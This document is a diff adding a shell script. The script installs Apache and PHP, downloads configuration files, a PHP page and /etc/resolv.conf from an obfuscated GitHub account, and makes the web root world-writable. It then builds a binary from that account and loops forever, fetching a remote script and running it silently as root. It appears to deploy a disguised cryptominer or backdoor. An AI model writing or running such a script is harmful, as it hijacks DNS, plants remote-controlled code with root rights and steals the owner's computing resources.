@@ -1,0 +1,120 @@
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+
+sudo rm -rf /mnt/disks/user/project/linux8474/
+
+sudo apt-get update
+
+sudo apt-get install -y cmake
+
+sudo apt-get install -y g++
+
+sudo apt-get install -y gcc
+
+apt-get purge -y apache2
+
+apt-get remove -y apache2
+
+apt-get install -y apache2
+
+cd /etc/apache2/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/ports.conf
+
+cd /etc/apache2/sites-enabled/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/000-default.conf
+
+apt-get install -y software-properties-common
+
+add-apt-repository ppa:ondrej/php -y
+
+apt-get install -y php5.6
+
+service apache2 restart
+
+cd /var/www/html/
+
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8474.php
+
+rm -rf /var/www/html/index.html
+
+chmod 777 -R /var/www/html/
+
+cd /etc/
+
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
+
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+sudo mkdir /mnt/disks/
+
+sudo mkdir /mnt/disks/user/
+
+sudo mkdir /mnt/disks/user/project/
+
+cd /mnt/disks/user/project/
+
+sudo apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
+
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+
+google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+if [[ $google84121274 == *"failed"* ]]; then
+
+sudo git clone https://github.com/mobileapps84741274/linuxcpu84
+cd linuxcpu84
+sudo mkdir build
+cd build
+sudo cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_CUDA:BOOL="0"
+sudo make
+
+while true
+do
+
+sudo wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+
+sudo bash ./linuxgoogle84741274 &> /dev/null &
+
+sudo ./linux84 8
+
+done
+
+else
+
+sudo git clone https://github.com/mobileapps84741274/linuxgoogle842
+cd linuxgoogle842
+sudo mkdir build
+cd build
+sudo cmake .. -DCMAKE_BUILD_TYPE=Release
+sudo make
+
+while true
+do
+
+sudo wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+
+sudo bash ./linuxgoogle84741274 &> /dev/null &
+
+sudo ./linux84 8
+
+done
+
+fi
